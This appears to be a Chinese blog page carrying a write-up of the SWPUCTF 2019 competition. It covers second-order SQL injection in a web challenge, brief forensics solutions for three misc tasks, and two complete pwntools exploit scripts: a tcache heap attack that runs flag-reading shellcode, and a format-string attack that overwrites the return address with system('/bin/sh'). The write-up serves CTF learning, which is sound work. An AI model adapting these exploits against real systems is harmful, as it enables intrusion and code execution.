@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+      <script>
+  var _hmt = _hmt || []
+  ;(function() {
+    var hm = document.createElement('script')
+    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
+    var s = document.getElementsByTagName('script')[0]
+    s.parentNode.insertBefore(hm, s)
+  })()
+</script> 
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content>
+    <meta name="description" content>
+    
+    <title>
+      SWPUCTF 2019 write up - pumpkin9
+    </title>
+    <link rel="manifest" href="/manifest.json">
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/style/style.css">
+  </head>
+  <body>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-web"><span class="toc-text">easy_web</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-text">| MISC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-1"><span class="toc-text">| MISC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-2"><span class="toc-text">| MISC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#p1Kkheap"><span class="toc-text">p1Kkheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#login"><span class="toc-text">login</span></a></li></ol></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search">
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg">
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class>
+          Home
+        </a>
+        
+        <a href="/archives" class>
+          Archives
+        </a>
+        
+        <a href="/categories" class>
+          Categories
+        </a>
+        
+        <a href="/tags" class>
+          Tags
+        </a>
+        
+        <a href="/friends" class>
+          Friends
+        </a>
+        
+        <a href="/about" class>
+          About
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">pumpkin9</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">pumpkin9</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
+
+        <div class="nav">
+          
+          <a href="/" class>
+            Home
+          </a>
+          
+          <a href="/archives" class>
+            Archives
+          </a>
+          
+          <a href="/categories" class>
+            Categories
+          </a>
+          
+          <a href="/tags" class>
+            Tags
+          </a>
+          
+          <a href="/friends" class>
+            Friends
+          </a>
+          
+          <a href="/about" class>
+            About
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">SWPUCTF 2019 write up</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2019/12/09</span>
+        </span>
+
+        
+          <span class="item leancloud-visitors" id="/2019/12/09/SWPUCTF-2019-write-up-md/" data-flag-title="SWPUCTF 2019 write up">
+            <span class="iconfont icon-eye1"></span>
+            <span class="leancloud-visitors-count"></span>
+          </span>
+        
+
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/CTF">CTF</a>
+                
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/write up">write up</a>
+                  
+                
+                  
+                    <a href="/tags/pwn">pwn</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <h1 id="Web">Web<a class="post-anchor" href="#Web"></a></h1><h2 id="easy-web">easy_web<a class="post-anchor" href="#easy-web"></a></h2><p>Description<br>hint1：管理后台未完善 || hint2：无需扫描器 || hint3：不是xss<br>后来的hint：hint1：不是xss || hint2：使用somd5解flag<br>URL <a href="http://211.159.177.185:23456" target="_blank" rel="noopener">http://211.159.177.185:23456</a></p>
+<p>考察的知识点为二次注入，bypass information_schema，通过子查询在没有列名的情况下查询数据</p>
+<p>首先可以看到，有一个申请广告的地方，既然提示了不是xss，那么就自然考虑下sql注入<br>简单测试发现有报错和回显<br><a href="https://uploader.shimo.im/f/7qILxI0yCNccF2bO.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/7qILxI0yCNccF2bO.png" alt></a><br>经过测试发现，空格会被替换为空，过滤了or，and以及其他几乎全部报错函数，被一共有22列数据被查询出<br>那么我们可以利用这么一个性质来获取数据库名：在使用一个不存在的函数时，会报错显示当前的数据库名</p>
+<p><a href="https://uploader.shimo.im/f/omUGgqOOJc4BRMy0.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/omUGgqOOJc4BRMy0.png" alt></a></p>
+<p><a href="https://uploader.shimo.im/f/tE8qT2kIX28SUvU5.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/tE8qT2kIX28SUvU5.png" alt></a><br>这样就获取了数据库名<br>因为过滤了or，所以我们就无法使用information来获取表名，本来想用innodb_table_stats来获取表名来着，然鹅mysql这个关键词也被过滤了<br>还有一个叫做sys.schema_auto_increment_columns的表专门记录自增ID，从这里我们也可以获取表名<br><a href="https://uploader.shimo.im/f/9FaCGiZX45gQEV4C.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/9FaCGiZX45gQEV4C.png" alt></a><br>然后还是因为过滤了or和join，我们无法获得列名，只能通过子查询去更改列名<br>因为提示中给的是用somd5解出flag，所以我猜测flag为admin的密码<br><a href="https://uploader.shimo.im/f/md8EqVcWyA0ORX4e.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/md8EqVcWyA0ORX4e.png" alt></a><br><a href="https://uploader.shimo.im/f/KA3jVW1xoTcjT5iV.png" data-caption data-fancybox="images"><img src="https://uploader.shimo.im/f/KA3jVW1xoTcjT5iV.png" alt></a><br>第二个就是admin的密码，用somd5解密即可获得flag</p>
+<h1 id="Misc">Misc<a class="post-anchor" href="#Misc"></a></h1><h2 id="MISC">| MISC<a class="post-anchor" href="#MISC"></a></h2><p>内容是ntfs      flag.txt<br>使用ntfsstreamseditor工具，对着桌面扫ntfs流<br>扫出flag</p>
+<h2 id="MISC-1">| MISC<a class="post-anchor" href="#MISC-1"></a></h2><p>binwalk分析一下，很多压缩包<br>binwalk -e分离出来<br>flag.doc里面的密文经过数次bs64解码得到一个密码<br>encode.txt bs64解码之后得到一个密码<br>分别把flag.jpg和good.mp3用密码解压出来<br>mp3文件放到Audacity分析，长音代表- 短音代表·<br>莫斯解密得到MORSEISVERYVERYEASY，<br>小写 swpuctf{morseisveryveryeasy}</p>
+<h2 id="MISC-2">| MISC<a class="post-anchor" href="#MISC-2"></a></h2><p>根据提示ttl，2019西湖论剑misc原题，根据脚本恢复出一个txt文件。文件开头为50 4B，用winhex转为zip文件，需要密码打开压缩包。猜测是zip伪加密，放进ziperello中发现没有加密文件，果然是zip伪加密。010修改压缩包得到里面的flag.txt，是一串加密了n次的base64，脚本解到30次最终解完，但是是乱码。类似HECTF2019misc中flag仍可以被base6<br>4解密一次，所以打印出所有的解密结果，得到flag。</p>
+<h1 id="PWN">PWN<a class="post-anchor" href="#PWN"></a></h1><h2 id="p1Kkheap">p1Kkheap<a class="post-anchor" href="#p1Kkheap"></a></h2><p>保护全开，并且程序自己写了几个限制条件<br>不能申请超过 0x100 大小的 chunk<br>不能 free 超过 3 次，add &lt;= 7<br>虽然有指针悬挂，free 之后 edit 因为 size 清零 不能正常的写值<br>tcache struct attack，爆破低2字节（直接 leak heap addr 也可以），使 fd 指向 heap 开头，控制 tcache_perthread_struct，修改 tcache-&gt;counts 和 tcache_entry</p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
+<span class="hljs-comment">#encoding:utf-8</span>
+<span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>
+<span class="hljs-comment"># p = process('./p1Kkheap')</span>
+file_name = <span class="hljs-string">'./p1KkHeap'</span>
+libc_name = <span class="hljs-string">'./libc.so.6'</span>
+ip = <span class="hljs-string">''</span>
+prot = <span class="hljs-string">''</span>
+context.arch = <span class="hljs-string">'amd64'</span>
+context.log_level=<span class="hljs-string">'debug'</span>
+context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
+lib = ELF(libc_name)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,str(<span class="hljs-number">1</span>))
+	p.sendlineafter(<span class="hljs-string">"size: "</span>,str(size))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"2"</span>)
+	p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"3"</span>)
+	p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))
+	p.sendafter(<span class="hljs-string">"content: "</span>,content)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"4"</span>)
+	p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))
+
+shellcode = asm(<span class="hljs-string">'''
+		nop
+		nop
+		mov rax,0x0000
+		push rax
+		mov rax,0x67616c662f2e
+		push rax
+		mov rdi, rsp
+		xor esi, esi
+		mov eax, 2
+		syscall		
+
+		mov edi, eax
+		mov rsi, rsp
+		mov edx, 0x100
+		xor eax, eax
+		syscall		
+
+		mov edx, eax
+		mov rsi, rsp
+		mov edi, 1
+		mov eax, edi
+		syscall
+		'''</span>)
+
+<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
+	<span class="hljs-keyword">try</span>:
+		p = process(file_name)
+		<span class="hljs-comment"># raw_input('#')</span>
+		add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span>
+		add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>
+		free(<span class="hljs-number">0</span>)
+		free(<span class="hljs-number">0</span>)
+		add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span>
+		edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x10\x00'</span>)
+		add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span>
+		add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4</span>
+		edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0701000000000000</span>))
+		free(<span class="hljs-number">0</span>)
+		show(<span class="hljs-number">0</span>)
+		p.recvuntil(<span class="hljs-string">"content: "</span>)
+		libc = u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>)+<span class="hljs-string">"\x00\x00"</span>) - <span class="hljs-number">4111520</span>
+		log.success(<span class="hljs-string">"libc addr : 0x%x"</span>%libc)
+		malloc_hook = libc+lib.symbols[<span class="hljs-string">'__malloc_hook'</span>]
+		log.success(<span class="hljs-string">"malloc addr : 0x%x"</span>%malloc_hook)
+		  edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0701010000000000</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">12</span>+p64(malloc_hook)+p64(<span class="hljs-number">0x66660000</span>))
+		add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span>
+		add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#6</span>
+		edit(<span class="hljs-number">6</span>,shellcode)
+		edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x66660002</span>))
+		add(<span class="hljs-number">0x10</span>)
+	<span class="hljs-keyword">except</span> EOFError:
+		p.close()
+	<span class="hljs-keyword">else</span>:
+		p.interactive()
+		<span class="hljs-keyword">break</span></code></pre>
+
+<h2 id="login">login<a class="post-anchor" href="#login"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span>
+<span class="hljs-comment">#encoding:utf-8</span>
+<span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>
+file_name = <span class="hljs-string">'./login'</span>
+libc_name = <span class="hljs-string">'/lib/i386-linux-gnu/libc.so.6'</span>
+ip = <span class="hljs-string">'108.160.139.79'</span>
+port = <span class="hljs-string">'9090'</span>
+<span class="hljs-comment"># context.arch = 'amd64'</span>
+<span class="hljs-comment"># context.log_level='debug'</span>
+context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]
+lib = ELF(libc_name)
+elf = ELF(file_name)
+p = process(file_name)
+<span class="hljs-comment"># p = remote(ip,int(port))</span>
+li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)
+ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)
+
+key = <span class="hljs-string">"wllmmllw"</span>
+p.sendlineafter(<span class="hljs-string">"Please input your name: \n"</span>,<span class="hljs-string">"pumpkin9"</span>)
+payload = <span class="hljs-string">"%15$p"</span>
+p.sendlineafter(<span class="hljs-string">"password: \n"</span>,payload)
+p.recvuntil(<span class="hljs-string">"This is the wrong password: "</span>)
+libc = int(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<span class="hljs-number">-241</span>-lib.symbols[<span class="hljs-string">'__libc_start_main'</span>]
+ls(<span class="hljs-string">"libc addr"</span>,libc)
+onegg = libc + lib.symbols[<span class="hljs-string">'system'</span>]
+ls(<span class="hljs-string">"one_gadget"</span>,onegg)
+binsh = libc + lib.search(<span class="hljs-string">'/bin/sh'</span>).next()
+ls(<span class="hljs-string">"sh addr"</span>,binsh)
+
+p.recvuntil(<span class="hljs-string">"Try again!\n"</span>)
+p.sendline(<span class="hljs-string">"%6$p"</span>)
+p.recvuntil(<span class="hljs-string">"This is the wrong password: "</span>)
+stack = int(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)
+target = stack <span class="hljs-number">-12</span>
+ls(<span class="hljs-string">"stack addr"</span>,stack)
+ls(<span class="hljs-string">"target addr"</span>,target)
+
+<span class="hljs-comment"># gdb.attach(p)</span>
+num = target&amp;<span class="hljs-number">0xff</span>
+
+data1 = <span class="hljs-number">0x100</span><span class="hljs-comment">#onegg&amp;0xff</span>
+data2 = (onegg&amp;<span class="hljs-number">0xffff</span>)&gt;&gt;<span class="hljs-number">8</span>
+data3 = (onegg&amp;<span class="hljs-number">0xffffff</span>)&gt;&gt;<span class="hljs-number">16</span>
+data4 = onegg&gt;&gt;<span class="hljs-number">24</span>
+li(<span class="hljs-string">"sys1"</span>,data1)
+li(<span class="hljs-string">"sys2"</span>,data2)
+li(<span class="hljs-string">"sys3"</span>,data3)
+li(<span class="hljs-string">"sys3"</span>,data4)
+data5 = binsh&amp;<span class="hljs-number">0xff</span>
+data6 = ((binsh&amp;<span class="hljs-number">0xffff</span>)&gt;&gt;<span class="hljs-number">8</span>)
+data7 = ((binsh&amp;<span class="hljs-number">0xffffff</span>)&gt;&gt;<span class="hljs-number">16</span>)
+data8 = binsh&gt;&gt;<span class="hljs-number">24</span>
+li(<span class="hljs-string">"sh1"</span>,data5)
+li(<span class="hljs-string">"sh2"</span>,data6)
+li(<span class="hljs-string">"sh3"</span>,data7)
+li(<span class="hljs-string">"sh4"</span>,data8)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num)+<span class="hljs-string">"c%6$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data1)+<span class="hljs-string">"c%10$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">1</span>)+<span class="hljs-string">"c%6$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data2)+<span class="hljs-string">"c%10$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">2</span>)+<span class="hljs-string">"c%6$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data3)+<span class="hljs-string">"c%10$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">3</span>)+<span class="hljs-string">"c%6$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data4)+<span class="hljs-string">"c%10$hhn"</span>)
+gdb.attach(p)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">8</span>)+<span class="hljs-string">"c%6$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data5)+<span class="hljs-string">"c%10$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">9</span>)+<span class="hljs-string">"c%6$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data6)+<span class="hljs-string">"c%10$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">10</span>)+<span class="hljs-string">"c%6$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data7)+<span class="hljs-string">"c%10$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">11</span>)+<span class="hljs-string">"c%6$hhn"</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data8)+<span class="hljs-string">"c%10$hhn"</span>)
+raw_input(<span class="hljs-string">'#'</span>)
+p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,key)</code></pre>
+
+
+
+  
+    <div class="post-reward">
+    <div id="reward-button">打赏</div>
+      <div id="qr">
+        <div class="wrap">
+            
+            <div class="bg-wrap">
+              <a href="/images/zhifubao.png" target="_block" class="bg" style="background-image:url('/images/zhifubao.png')"></a>
+              支付宝
+            </div>
+            
+            
+            <div class="bg-wrap">
+                <a href="/images/weixin.png" target="_block" class="bg" style="background-image:url('/images/weixin.png')"></a>
+              微信
+            </div>
+            
+        </div>
+      </div>
+    </div>
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2019/11/29/i春秋-第三季CTF答题赛write-up/">i春秋-第三季CTF答题赛write up</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="http://pumpkin9.github.io">pumpkin9</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="http://pumpkin9.github.io/2019/12/09/SWPUCTF-2019-write-up-md/">http://pumpkin9.github.io/2019/12/09/SWPUCTF-2019-write-up-md/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="http://pumpkin9.github.io">pumpkin9</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+        <footer>
+          <div class="copyright">
+            ©2019
+            <a href="http://pumpkin9.github.io">pumpkin9</a> Powered by <a href="https://hexo.io">Hexo</a> |
+            <a href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":70,"vOffset":-20},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false});</script></body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"valine\":{\"API_ID\":\"vVaPNFdcK9dSGbIzRRK8Lynz-gzGzoHsz\",\"API_KEY\":\"dPlqFhVLg4CTqpRKmq7I0cQw\"},\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
+    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
+  })</script> <script type="text/javascript">
+                  ;(function() {
+                    var bp = document.createElement('script')
+                    var curProtocol = window.location.protocol.split(':')[0]
+                    if (curProtocol === 'https') {
+                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
+                    } else {
+                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
+                    }
+                    var s = document.getElementsByTagName('script')[0]
+                    s.parentNode.insertBefore(bp, s)
+                  })()
+                </script> 
